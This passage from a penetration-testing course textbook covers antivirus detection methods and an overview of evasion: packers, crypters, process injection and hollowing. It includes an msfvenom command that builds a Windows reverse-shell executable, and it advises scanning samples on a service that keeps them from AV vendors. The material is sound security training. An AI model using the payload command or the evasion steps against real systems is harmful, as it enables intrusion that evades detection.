Let’s dump its binary representation via the xxd552 tool by passing the -b argument before the file
name. k
kali@kali:~$ xxd -b malware.txt
s
00000000: 01101111 01100110 01100110 01110011 01100101 01100011 offsec
00000006: 00001010 .
Listing 233 - Inspecting the boinary file content with xxd
We displayed the content of the file through the xxd utility. The output shows the binary offset on
the leftmost column, the actual binary rnepresentation in the middle column, and the ASCII
translation on the rightmost one. We have also highlighted the binary representation of the letter
“c” in red. Its purpose will become clear shortly.
i
Now, assuming this is real malwazre, we want to calculate the hash of the file and we can do so
through the sha256sum utility.
D
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e malware.txt
Listing 234 - Calculating the SHA256 hash of the file
Let’s now replace the last letter of the “offsec” string with a capital C and dump its binary value via
xxd once more.
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011 offseC
00000006: 00001010
Listing 235 - Inspecting the file content with xxd
In listing 235, we notice that the binary value of the last letter is changed only in its third bit from
the left.
Since every hashing algorithm is supposed to produce a totally different hash even if only one bit
has changed, let’s calculate the SHA256 hash on the modified string.
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c malware.txt
552 (die.net, 2022), https://linux.die.net/man/1/xxd
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 353
Made in Morocco
Penetration Testing with Kali Linux
Listing 236 - Calculating the SHA256 hash on the modified file
Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on
hash file signature detections.
To address the pitfalls of signature-based detection, antivirus manufacturers introduced
additional detection methods to improve the effectiveness of their products.
Heuristic-Based Detection553 is a detection method that relies on various rules and algorithms to
determine whether or not an action is considered malicious. This is often achieved by stepping
through the instruction set of a binary file or by attempting to disassemble the machine code and
ultimately decompile and analyze the source code to obtain a more comprehensive map of the
program. The idea is to search for various patterns and program calls (as opposed to simple byte
sequences) that are considered malicious.
Alternatively, Behavior-Based Detection554 dynamically analyzes the byehavior of a binary file. This
is often achieved by executing the file in question in an emulated environment, such as a small
virtual machine, and searching for behaviors or actions that arek considered malicious.
Lastly, Machine-Learning Detection aims to up the game by introducing ML algorithms to detect
s
unknown threats by collecting and analyzing additional metadata.555 For instance, Microsoft
Windows Defender has two ML components: the client ML engine, which is responsible for
creating ML models and heuristics, and the cloudo ML engine, which is capable of analyzing the
submitted sample against a metadata-based model comprised of all the submitted samples.556
Whenever the client ML engine is unable to determine whether a program is benign or not, it will
n
query the cloud ML counterpart for a final response.
Since these techniques do not require malware signatures, they can be used to identify unknown
i
malware, or variations of known malware, more effectively. Given that antivirus manufacturers
z
use different implementations when it comes to heuristics, behavior, and machine learning
detection, each antivirus product will differ in terms of what code is considered malicious.
D
It’s worth noting that the majority of antivirus developers use a combination of these detection
methods to achieve higher detection rates.
In order to demonstrate the effectiveness of various antivirus products, we will start by scanning
a popular Metasploit payload. Using msfvenom, we will generate a standard Portable Executable
(PE)557 file containing our payload. In this case we will use a simple TCP reverse shell.
The PE file format is used on Windows operating systems for executable and
object files. The PE format represents a Windows data structure that details the
553 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Heuristic_analysis
554 (Tristan Aubrey-Jones, 2007), https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf
555 (Microsoft, 2022), https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-
antivirus-sample-submission?view=o365-worldwide
556 (Microsoft, 2022), https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-
Defenses-Against-Adversarial-Attacks.pdf
557 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Portable_Executable
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 354
Made in Morocco
Penetration Testing with Kali Linux
information necessary for the Windows Loader558 to manage the wrapped
executable code including required dynamic libraries, API import and export
tables, etc.
Before generating any Metasploit payloads, it is a best practice to make sure we are running the
latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as
well. AV vendors have to rebuild those signatures and push them as updates. This constant and
intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a
penetration test, since a fresh Metasploit version might run undetected due to stale AV
signatures.
Let’s generate the test binary payload by running the msfvenom command followed by the -p
argument specifying the payload. We’ll then pass the reverse shell local host (LHOST) and local
y
port (LPORT) arguments along with the EXE file format and redirect the output to a file named
binary.exe.
k
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe
> binary.exe
s
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 froom the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes n
Listing 237 - Generating a malicious PE containing a meterpreter shell.
Next, we will run a virus scan on thisi executable. Rather than installing a large number of antivirus
applications on our local machinze, we can upload our file to VirusTotal,559 which will scan it to
determine the detection rate of various AV products.
D
VirusTotal is convenient, but it generates a hash along with storing the original
file for each unique submission. The submitted files along with the metadata are
then shared with all participating AV vendors. As such, take care when
submitting sensitive payloads as the hash is considered public from the time of
first submission.
The results of this scan are listed below.
558 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Loader_(computing)
559 (VirusTotal, 2019), https://www.virustotal.com/#/home/upload
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 355
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
i
z
D
Figure 194: Virustotal results on the msfvenom payload.
We’ll notice in our results that many antivirus products determined our file is malicious based on
the different detection mechanisms we have illustrated in this section.
In this Learning Unit, we have explored the different components that constitute a modern AV and
covered the various strategies adopted to detect malicious software.
In the next Learning Unit, we are going to make use of this knowledge and learn the different
mechanisms that enable attackers to evade antivirus detections.
12.2 Bypassing Antivirus Detections
This Learning Unit covers the following Learning Objectives:
• Understand on-disk evasion techniques
• Understand in-memory evasion techniques
Generally speaking, antivirus evasion falls into two broad categories: on-disk and in-memory. On-
disk evasion focuses on modifying malicious files physically stored on disk in an attempt to evade
AV file engine detections. However, given the maturity of modern AV file scanning engines,
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 356
Made in Morocco
Penetration Testing with Kali Linux
modern malware often attempts in-memory operation, which avoids the disk entirely and
therefore, reduces the possibility of being detected. In the following sections, we will give a very
general overview of some of the techniques used in both of these approaches. Please note that
details about these techniques are outside the scope of this Module.
12.2.1 On-Disk Evasion
To begin our discussion of evasion, we will first inspect various techniques used to obfuscate
files stored on a physical disk.
Modern on-disk malware obfuscation can take many forms. One of the earliest ways of avoiding
detection involved the use of packers.560 Given the high cost of disk space and slow network
speeds during the early days of the internet, packers were originally designed to reduce the size of
an executable. Unlike modern “zip” compression techniques, packers generate an executable that
is not only smaller, but is also functionally equivalent with a completyely new binary structure. The
file produced has a new hash signature and as a result, can effectively bypass older and more
simplistic AV scanners. Even though some modern malware uses a variation of this technique,
k
the use of UPX561 and other popular packers alone is not sufficient to evade modern AV scanners.
Obfuscators reorganize and mutate code in a way that msakes it more difficult to reverse-engineer.
This includes replacing instructions with semantically equivalent ones, inserting irrelevant
instructions or dead code,562 splitting or reorderingo functions, and so on. Although primarily used
by software developers to protect their intellectual property, this technique is also marginally
effective against signature-based AV detection. Modern obfuscators also have runtime in-
n
memory capabilities, which aims to hinder AV detection even further.
Crypter software cryptographically alters executable code, adding a decryption stub that restores
i
the original code upon execution. This decryption happens in-memory, leaving only the encrypted
z
code on-disk. Encryption has become foundational in modern malware as one of the most
effective AV evasion techniques.
D
Highly effective antivirus evasion requires a combination of all of the previous techniques in
addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine
emulation detection, and so on. In most cases, software protectors were designed for legitimate
purposes, like anti-copy, but can also be used to bypass AV detection.
Most of these techniques may appear simple at a high-level but they can be quite complex.
Because of this, there are currently few actively-maintained free tools that provide acceptable
antivirus evasion. Among commercially available tools, The Enigma Protector563 in particular can
be used to successfully bypass antivirus products.
560 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Executable_compression
561 (UPX, 2018), https://upx.github.io/
562 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Dead_code
563 (Enigma Protector, 2019), http://www.enigmaprotector.com/en/home.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 357
Made in Morocco
Penetration Testing with Kali Linux
12.2.2 In-Memory Evasion
In-Memory Injections,564 also known as PE Injection, is a popular technique used to bypass
antivirus products on Windows machines. Rather than obfuscating a malicious binary, creating
new sections, or changing existing permissions, this technique instead focuses on the
manipulation of volatile memory. One of the main benefits of this technique is that it does not
write any files to disk, which is a commonly focused area for most antivirus products.
There are several evasion techniques565 that do not write files to disk. While we will still provide a
brief explanation for some of them, we will only cover in-memory injection using PowerShell in
detail as the others rely on a low-level programming background in languages such as C/C++ and
are outside of the scope of this Module.
The first technique we are going to cover is Remote Process Memory Injection, which attempts to
inject the payload into another valid PE that is not malicious. The moyst common method of doing
this is by leveraging a set of Windows APIs.566 First, we would use the OpenProcess567 function to
obtain a valid HANDLE568 to a target process that we have permission to access. After obtaining
k
the HANDLE, we would allocate memory in the context of that process by calling a Windows API
such as VirtualAllocEx.569 Once the memory has been allocated in the remote process, we would
s
copy the malicious payload to the newly allocated memory using WriteProcessMemory.570 After
the payload has been successfully copied, it is usually executed in memory in a separate thread
using the CreateRemoteThread571 API. o
This sounds complex, but we will use a similar technique in a later example, allowing PowerShell
n
to do the heavy lifting and a very similar but simplified attack targeting a local powershell.exe
instance.
i
Unlike regular DLL injection, which involves loading a malicious DLL from disk using the
z
LoadLibrary572 API, the Reflective DLL Injection technique attempts to load a DLL stored by the
attacker in the process memory.573
D
The main challenge of implementing this technique is that LoadLibrary does not support loading a
DLL from memory. Furthermore, the Windows operating system does not expose any APIs that
can handle this either. Attackers who choose to use this technique must write their own version
of the API that does not rely on a disk-based DLL.
The third technique we want to mention is Process Hollowing.574 When using process hollowing to
bypass antivirus software, attackers first launch a non-malicious process in a suspended state.
564 (Endgame, 2017), https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-
and-trending-process
565 (F-Secure, 2018), https://blog.f-secure.com/memory-injection-like-a-boss/
566 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Windows_API
567 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
568 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Handle_(computing)
569 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
570 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
571 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-
createremotethread
572 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
573 (Andrea Fortuna, 2017), https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 358
Made in Morocco
Penetration Testing with Kali Linux
Once launched, the image of the process is removed from memory and replaced with a malicious
executable image. Finally, the process is then resumed and malicious code is executed instead of
the legitimate process.
Ultimately, Inline hooking, as the name suggests, involves modifying memory and introducing a
hook (an instruction that redirects the code execution) into a function to make it point to our
malicious code. Upon executing our malicious code, the flow will return back to the modified
function and resume execution, appearing as if only the original code had executed.
Hooking is a technique often employed by rootkits,575 a more stealthy kind of malware. Rootkits
aim to provide the malware author dedicated and persistent access to the target system through
modification of system components in user space, kernel, or even at lower OS protection rings576
such as boot or hypervisor. Since rootkits need administrative privileges to implant its hooks, it is
often installed from an elevated shell or by exploiting a privilege-escalation vulnerability.
y
12.3 AV Evasion in Practice
k
This Learning Unit covers the following Learning Objectives:
• Understand antivirus evasion testing best practicess
• Manually evade AV solutions
o
• Leverage automated tools for AV evasion
Depending on the kind of AV we are facinng during an engagement, we might want to resort to
automated or manual AV evasion avenues. Either way, we first need to understand the pros and
cons associated with these strategies. In this Learning Unit, we are going to first understand best
i
practices related to AV evasion and how to perform a real AV bypass along with basic manual in-
z
memory evasion through PowerShell. Finally, we are going to rely on third-party tools to automate
on-disk and in-memory evasion techniques.
D
12.3.1 Testing for AV Evasion
The term SecOps defines the joint collaboration between the enterprise IT department and the
Security Operations Center (SOC). The goal of the SecOps team is to provide continuous
protection and detection against both well-known and novel threats.
As penetration tester, we want to develop a realistic understanding of the considerations facing
SecOps teams when dealing with AV products. For this reason we should start considering a few
extra implications regarding antivirus evasion development that could help us on our
engagements.
As an initial example, VirusTotal can give us a good glimpse of how stealthy our malware could
be, once scanned, the platform sends our sample to every antivirus vendor that has an active
membership.
574 (Mantvydas Baranauskas, 2019), https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-
image-relocations
575 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Rootkit
576 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Protection_ring
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 359
Made in Morocco
Penetration Testing with Kali Linux
This means that shortly after we have submitted our sample, most of the AV vendors will be able
run it inside their custom sandbox and machine learning engines to build specific detection
signatures, thus rendering our offensive tooling unusable.
As an alternative to VirusTotal, we should resort to AntiScan.Me.577 This service scans our sample
against 30 different AV engines and claims to not divulge any submitted sample to third-parties.
The service offers up to four scans a day and additional ones at a small fee after the daily limit
has been reached.
However, relying on tools such as AntiScan.Me is considered a last resort when we don’t know
the specifics of our target’s AV vendor. If we do know those specifics on the other hand, we